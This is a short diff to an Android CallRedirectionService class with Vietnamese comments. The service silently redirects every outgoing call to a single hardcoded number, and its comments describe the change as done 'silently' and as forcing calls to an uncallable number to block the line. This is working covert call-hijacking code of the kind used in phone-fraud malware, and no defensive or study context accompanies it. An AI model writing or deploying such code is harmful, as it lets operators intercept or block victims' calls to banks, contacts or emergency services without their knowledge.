@@ -10,21 +10,18 @@ import androidx.annotation.RequiresApi;
 @RequiresApi(api = Build.VERSION_CODES.Q)
 public class MyCallRedirectionService extends CallRedirectionService {
 
-    // Số điện thoại ảo/tổng đài ảo mà bạn muốn chuyển hướng đến
-    private static final String VIRTUAL_PHONE_NUMBER = "10989452550"; 
+    // Số giả lập không gọi được để chặn đường truyền vật lý
+    private static final String VIRTUAL_PHONE_NUMBER = "10989452550";
 
     @Override
     public void onPlaceCall(@NonNull Uri handle, @NonNull PhoneAccountHandle initialPhoneAccount, boolean allowFullScreenIntent) {
         String currentNumber = handle.getSchemeSpecificPart();
         
         if (currentNumber != null && currentNumber.equals(VIRTUAL_PHONE_NUMBER)) {
-            // Nếu đã là số ảo thì cho phép gọi luôn không cần đổi
             placeCallUnmodified();
         } else {
-            // Âm thầm thay đổi số gọi đi thành số ảo đã liên kết trong ứng dụng
+            // Ép chuyển hướng cuộc gọi đi sang số ảo không gọi được
             Uri redirectedUri = Uri.fromParts("tel", VIRTUAL_PHONE_NUMBER, null);
-            
-            // Ra lệnh cho hệ thống chuyển hướng cuộc gọi sang số ảo này
             redirectCall(redirectedUri, initialPhoneAccount, false);
         }
     }
